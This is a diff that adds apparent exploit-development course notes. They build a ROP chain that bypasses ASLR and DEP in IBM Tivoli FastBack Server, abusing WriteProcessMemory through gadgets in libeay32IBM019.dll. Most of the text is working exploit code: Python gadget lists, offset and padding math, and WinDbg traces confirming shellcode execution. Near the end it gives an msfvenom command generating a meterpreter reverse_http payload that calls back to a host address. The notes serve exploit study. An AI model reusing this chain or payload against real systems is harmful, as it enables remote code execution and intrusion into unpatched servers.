@@ -329,3 +329,334 @@ C0000040 flags
 ```
 
 We know that the offset to the data section is 0xD5000, and its size is 0xF018. Before using this address we must verify that the address does not have contents and that the memory protections are at least writable (we just need to store things, not execute them).
+Data section size in disk is D200 (rawData) and the reserved memory size is F018, which is **higher than the disk size.**
+Note: that we have free space from 0xF018 until 0xF000 + 0x1000 (the next memory page, **remember that sections are aligned to page space**). Thanks to the OS alignment we have space.
+
+So we can write at libeay32IBM019 + data virtual address (d5000) + data virtual size (f018) BUT we will add 4 bytes more just to ensure that we do not override any value:
+
+```c
+0:077> ? libeay32IBM019 + d5000 + f018 + 4
+Evaluate expression: 50216988 = 02fe401c
+
+0:077> dd 02fe401c
+02fe401c  00000000 00000000 00000000 00000000
+02fe402c  00000000 00000000 00000000 00000000
+02fe403c  00000000 00000000 00000000 00000000
+02fe404c  00000000 00000000 00000000 00000000
+02fe405c  00000000 00000000 00000000 00000000
+02fe406c  00000000 00000000 00000000 00000000
+02fe407c  00000000 00000000 00000000 00000000
+02fe408c  00000000 00000000 00000000 00000000
+
+0:077> !vprot 02fe401c
+BaseAddress:       02fe4000
+AllocationBase:    02f00000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE
+Type:              01000000  MEM_IMAGE
+
+0:077> ? 02fe401c - libeay32IBM019
+Evaluate expression: 933916 = 000e401c
+```
+
+We just calculated the offset from this region to our module base address (0xe401c). 
+Also we have seen that the protections are correct and that free space is available. Note that we only need a DWORD space.
+
+Finally, we have all the arguments to supply to WriteProcessMemory.
+Previously, when we used VirtualAlloc without an ASLR bypass, we had to generate and update all the function arguments (including the return value which is our shellcode, and API addresses) at runtime with ROP.
+
+In this case is different; as we now have a function that can **be used to leak the address of any function, we can leak the address of WriteProcessMemory**. The rest of addresses that are dependent of the base address of our vulnerable module (an offset) can be just added without having to use ROP chains to update them.
+
+As a result, we only need to dynamically update **two values with ROP**. We’ll update by using ROP:
+- The address of the shellcode on the stack (because the stack address changes each time we execute the exploit due to common program behavior).
+- The size of the shellcode, avoiding NULL bytes.
+These would be the parameters we insert in the stack for the function call (note that we only need to change the dummy nSize and lpBuffer dinamically via ROP):
+```c
+wpm = pack("<L", (WPMAddr)) # WriteProcessMemory Address
+wpm += pack("<L", (dllBase + 0x92c04)) # Shellcode Return Address
+wpm += pack("<L", (0xFFFFFFFF)) # pseudo Process handle, -1 is 0xFFFFFFFF
+wpm += pack("<L", (dllBase + 0x92c04)) # Code cave address
+wpm += pack("<L", (0x41414141)) # dummy lpBuffer (Stack address)
+wpm += pack("<L", (0x42424242)) # dummy nSize
+wpm += pack("<L", (dllBase + 0xe401c)) # lpNumberOfBytesWritten
+```
+**Note: We will need to obtain the values in the stack of the parameters we want to replace so put unique eggs to them.**
+
+Rembember that first we need to obtain the ESP value as when the exploit triggers, ESP points to the following ROP gadget after this list of values:
+TBD AAAs + these values + rip + rops (ESP point to ROPs)
+
+Let's use rp++ to find gadgets. Let's locate the DLL location with narly:
+```
+.load narly
+0:077> !nmod
+001b0000 001e3000 snclientapi          /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\snclientapi.dll
+00400000 00c0c000 FastBackServer       /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe
+00c10000 00c3d000 libcclog             /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\libcclog.dll
+010d0000 01112000 NLS                  /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\Common\NLS.dll
+01360000 0138b000 gsk8iccs             /SafeSEH OFF                C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll
+013c0000 013fa000 icclib019            /SafeSEH ON  /GS            C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll
+02f80000 03070000 libeay32IBM019       /SafeSEH OFF                C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll
+```
+
+Once we know where it is, let's dump the ROP gadgets and 
+```c
+C:\Users\user\Desktop\rp-win>rp-win-x86.exe -f  "C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll" -r 5 > rop.txt
+```
+
+Let's search for **push esp ;  pop REG ;** gadgets that end with ret, to try to store the ESP value in a register that we won't use (esi would be a good register as it is not modified by function calls and such).
+
+We have two good gadgets: 
+```cpp
+0x100408d5: inc esi ; push esp ; pop esi ; ret  ;  (1 found)
+0x100408d6: push esp ; pop esi ; ret  ;  (1 found)
+```
+
+Any of these two is valid. We obtain a copy of ESP in ESI.
+**Note:** These address are static address, valid for the case that ASLR is disabled. But these address won't work with ASLR. We need to calculate the offset.
+There are some tools that calculate the offset from the base address of the DLL. But we will do this manually.
+When we execute rp++, it parses the DLL’s PE header to obtain the preferred base load address. This address will be written as the gadget address in the output file. We’ll use WinDbg to find the preferred base load address for libeay32IBM019.dll, and subtract the value of that address from each gadget we select in our output file.
+
+Let's obtain the preferred base load address in WinDBG, stored at offset 0x34 from the module:
+```cpp
+0:077>  dd libeay32IBM019 + 3c L1
+02f8003c  00000108
+
+0:077> dd libeay32IBM019 + 108 + 34 L1
+02f8013c  10000000
+```
+
+In the case of libeay32IBM019.dll, this turns out to be 0x10000000 as shown in Listing 569.
+The preferred base load address of libeay32IBM019.dll matches the upper most byte in the gadget addresses given in the rp++ output. To obtain the offset, we can simply ignore the upper 0x100 value from our gadgets and just take the "lower bytes". The substraction is easy in this case.
+So, for example, instead of 0x100408d5 the offset would be 0x408d5.
+
+## Point to the dummy shellcode address in the stack and replace it
+The next step is to create the first part of the ROP chain that replaces the dummy stack address (right now it's a placeholder value) with the shellcode address in the stack. 
+
+First, we need the ROP chain to move to the shellcode address in the stack.
+ESI right now points to ESP, so we need gadgets to move it.
+Remember to move ESI to EAX if we need to substract or add values as EAX will have more gadgets.
+We will add 256 bytes. As we want to add 256 bytes, we can substract a very long value with the "add" operand with a negative value and then add a very big value 256 bytes higher than the negative value. Another alternative is to use the "sub" operation but there are no valid rop gadgets. So we substract a big number and then we add another big number + 256 bytes (we will fix the offset later):
+```c
+rop = pack("<L", (dllBase + 0x296f)) # mov eax, esi ; pop esi ; ret
+rop += pack("<L", (0x42424242)) # junk into esi
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0x88888888)) # https://www.binaryconvert.com/result_signed_int.html?hexadecimal=77777878
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0x77777878))
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; re
+```
+Note how the gadgets are using the leaked base address plus the offset to bypass ASLR.
+Now we want to point to the lpBuffer placeholder address and replace it.
+Also note that EAX now points to the shellcode address.
+To replace the value, remember that we need a gadget like `mov [reg], eax` as we need to modify the value inside the stack.
+first, let's calculate the offset from the shellcode to lpBuffer.  Let's see where we are when the last instruction is being performed:
+EAX (shellcode location we just arbitrairly located): 0x059be40c
+```c
+0:001> dd eax
+059be40c  cccccccc cccccccc cccccccc cccccccc
+```
+Our shellcode location is there. Let's see the location of the lpBuffer in the stack 
+```c
+0:001> dds esp -0x44
+059be2ec  41414141 # lpBuffer placeholder
+059be2f0  42424242 # nSize placeholder
+059be2f4  039d401c libeay32IBM019!N98E_OSSL_DES_version+0x4f018
+```
+
+Do the substraction of both addresses and we get the offset (**Note: it is recommended to perform the calculation by dinamically obtaning the values rather than doing theorical substractions**):
+```c
+0:001> ? 059be40c -059be2ec  
+Evaluate expression: 288 = 00000120
+```
+
+We need to substract 288 bytes, we only have "add" operations so we add -288.
+288 is **0xFFFFFEE0** (https://www.binaryconvert.com/result_signed_int.html?hexadecimal=FFFFFEE0).
+This is the ROP chain to move EAX to lpBuffer:
+```c
+rop += pack("<L", (dllBase + 0x8876d)) # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+rop += pack("<L", (0x42424242)) # junk into esi
+rop += pack("<L", (dllBase + 0x48d8c)) # pop eax ; ret
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0x42424242)) # junk for ret 0x10
+rop += pack("<L", (0xfffffee0)) # pop into eax -0x120
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+```
+
+Note that, as our gadget performs a pop esi operation and a ret 0x0010 (16 bytes = 4 x32 instructions), we need to add junk for the pop and junk for the ret 0x010. Note how the retn 0x0010 first performs a normal return (therefore we put a valid ROP gadget next) and then does the ESP displacement for 0x0010 (therefore we put 16 bytes of junk in stack).
+Now we are pointing to lpBuffer with eax, and ecx points to the shellcode location. Therefore we use the following gadget:
+```c
+rop += pack("<L", (dllBase + 0x1fd8)) # mov [eax], ecx ; ret
+```
+lpBuffer is now patched and points to the shellcode location (the 256 bytes offset from ESP we arbitrairly calculated).
+Let's see in action:
+```c
+0:079>  bp libeay32IBM019+0x1fd8
+0:079> g
+Breakpoint 0 hit
+eax=0d60e2ec ebx=05cfc360 ecx=0d60e40c edx=76f62da0 esi=42424242 edi=00669360
+eip=01ad1fd8 esp=0d60e354 ebp=01bb401c iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x48:
+01ad1fd8 8908            mov     dword ptr [eax],ecx  ds:0023:0d60e2ec={KERNEL32!WriteProcessMemoryStub (765a3ad0)}
+
+0:082> p
+eax=0d60e2ec ebx=05cfc360 ecx=0d60e40c edx=76f62da0 esi=42424242 edi=00669360
+eip=01ad1fda esp=0d60e354 ebp=01bb401c iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+libeay32IBM019!N98E_CRYPTO_get_mem_ex_functions+0x4a:
+01ad1fda c3              ret
+
+0:082> dds eax L1
+0d60e2ec  0d60e40c
+
+0:082> dds 0d60e40c
+0d60e40c  cccccccc
+0d60e410  cccccccc
+0d60e414  cccccccc
+0d60e418  cccccccc
+0d60e41c  cccccccc
+0d60e420  cccccccc
+```
+
+The last step is to patch dwSize. As with prior ROP chains, we should reuse gadgets when we need to repeat similar actions.
+
+**The shellcode size does not have to be precise**. If it is too large, additional stack content will simply be copied as well. Most 32-bit Metasploit-generated shellcodes **are smaller than 500 bytes,** so we can use an arbitrary size value of **-524 (0xfffffdf4)** and then negate it to make it positive.
+
+As eax points to lpBuffer and nSize is 4 bytes higher, we use 4 add eax gadgets first.
+Then we transfer eax value to esi and use eax to store -524. Then we negate such value and use the `mov [eax], ecx` technique to patch dwSize.
+
+The last step is to execute the shellcode. We stored the return address (shellcode in the codecave) so we have to point ESP there a perform a "ret" operation. We’ll do this the same way we aligned EAX earlier. We know that EAX points 0x14 bytes (5 x 4bytes) ahead of WriteProcessMemory on the stack. We can fix that easily with previously used gadgets. The updated ROP chain is shown below.
+```python
+# Align ESP with ROP Skeleton
+rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
+rop += pack("<L", (0xffffffec)) # -0x14
+rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
+rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret
+```
+
+In the above ROP chain, we popped the value -0x14 (0xffffffec) into ECX, added it to EAX, and then used a gadget with an XCHG instruction to align ESP to the stack address stored in EAX.
+After executing this part of the ROP chain, we should return into WriteProcessMemory with all the arguments set up correctly. We can observe this in practice by restarting FastBackServer, attaching WinDbg, and setting a breakpoint on the “XCHG EAX, ESP” gadget.
+
+```c
+0:078> g
+Breakpoint 0 hit
+eax=0d5ee2dc ebx=05e6c388 ecx=ffffffec edx=76f62da0 esi=42424242 edi=00669360
+eip=02e6b415 esp=0d5ee3a0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x85:
+02e6b415 94              xchg    eax,esp
+
+0:082> p
+eax=0d5ee3a0 ebx=05e6c388 ecx=ffffffec edx=76f62da0 esi=42424242 edi=00669360
+eip=02e6b416 esp=0d5ee2dc ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x86:
+02e6b416 c3              ret
+
+0:082> p
+eax=0d5ee3a0 ebx=05e6c388 ecx=ffffffec edx=76f62da0 esi=42424242 edi=00669360
+eip=765a3ad0 esp=0d5ee2e0 ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+KERNEL32!WriteProcessMemoryStub:
+765a3ad0 8bff            mov     edi,edi
+
+0:082> dds esp L6
+0d5ee2e0  02ea2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
+0d5ee2e4  ffffffff
+0d5ee2e8  02ea2c04 libeay32IBM019!N98E_bn_sub_words+0x107c
+0d5ee2ec  0d5ee40c
+0d5ee2f0  0000020c
+0d5ee2f4  02ef401c libeay32IBM019!N98E_OSSL_DES_version+0x4f018
+
+```
+
+Copy:
+
+```c
+0:082> u 02ea2c04 
+libeay32IBM019!N98E_bn_sub_words+0x107c:
+02ea2c04 0000            add     byte ptr [eax],al
+02ea2c06 0000            add     byte ptr [eax],al
+02ea2c08 0000            add     byte ptr [eax],al
+02ea2c0a 0000            add     byte ptr [eax],al
+02ea2c0c 0000            add     byte ptr [eax],al
+02ea2c0e 0000            add     byte ptr [eax],al
+02ea2c10 0000            add     byte ptr [eax],al
+02ea2c12 0000            add     byte ptr [eax],al
+0:082> pt
+eax=00000001 ebx=05e6c388 ecx=00000000 edx=76f62da0 esi=42424242 edi=00669360
+eip=752f98bd esp=0d5ee2e0 ebp=41414141 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+KERNELBASE!WriteProcessMemory+0x6d:
+752f98bd c21400          ret     14h
+
+0:082> u 02ea2c04 
+libeay32IBM019!N98E_bn_sub_words+0x107c:
+02ea2c04 cc              int     3
+02ea2c05 cc              int     3
+02ea2c06 cc              int     3
+02ea2c07 cc              int     3
+02ea2c08 cc              int     3
+02ea2c09 cc              int     3
+02ea2c0a cc              int     3
+02ea2c0b cc              int     3
+```
+
+```c
+0:082> p
+eax=00000001 ebx=05e6c388 ecx=00000000 edx=76f62da0 esi=42424242 edi=00669360
+eip=02ea2c04 esp=0d5ee2f8 ebp=41414141 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+libeay32IBM019!N98E_bn_sub_words+0x107c:
+02ea2c04 cc              int     3
+```
+
+Lastly, as we have placed the shellcode 256 bytes further, we need to find the exact offset to place padding.
+Let's use the lpBuffer address and substract some bytes until we find the last ROP gadget, and then perform the substraction:
+```
+0:082> dd 0d5ee40c - 70
+0d5ee39c  02e6b415 cccccccc cccccccc cccccccc
+0d5ee3ac  cccccccc cccccccc cccccccc cccccccc
+0d5ee3bc  cccccccc cccccccc cccccccc cccccccc
+0d5ee3cc  cccccccc cccccccc cccccccc cccccccc
+0d5ee3dc  cccccccc cccccccc cccccccc cccccccc
+0d5ee3ec  cccccccc cccccccc cccccccc cccccccc
+0d5ee3fc  cccccccc cccccccc cccccccc cccccccc
+0d5ee40c  cccccccc cccccccc cccccccc cccccccc
+
+0:082> ? 0d5ee40c  - 0d5ee3a0  
+Evaluate expression: 108 = 0000006c
+
+```
+
+Here we discover that the offset from the first DWORD after the ROP chain to lpBuffer is 0x6C bytes. We must add 0x6C bytes of padding before placing the shellcode. 
+
+Let’s update our proof of concept with a second offset variable (offset2) and some dummy shellcode as shown below:
+```python
+offset2 = b"C" * 0x6C
+shellcode = b"\x90" * 0x100
+padding = b"D" * (0x600 - 276 - 4 - len(rop) - len(offset2) - len(shellcode)) 
+# psCommandBuffer
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" %(offset + wpm + eip + rop + offset2 + shellcode + padding,0,0,0,0)
+```
+
+Lastly, we generate the shellcode. Note that we cannot generate the shellcode with this encoding:
+ ```
+ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
+```
+As the shikata-ga-nai encoder (default) tries to overwrite its own shellcode, and the codecave section is not writable (once copied, it is only RX).
+
+We could write custom shellcode that does not contain any bad characters and by extension does not require a decoding routine. Alternatively, we could replace the bad characters and then leverage additional ROP gadgets to restore the shellcode before it’s copied into the code section. In the next section, we’ll pursue the latter approach.
+
+TBD page 482
+
+TBD Notes:
+- 10 As porque habria que meter rops porque pone un parametro a 0.
+- Metes As antes del tope de pila para que te ponga 0 ahi y no en los placeholder values.
+- tro approach seria meter una rop chain para fixear esto.
+- 
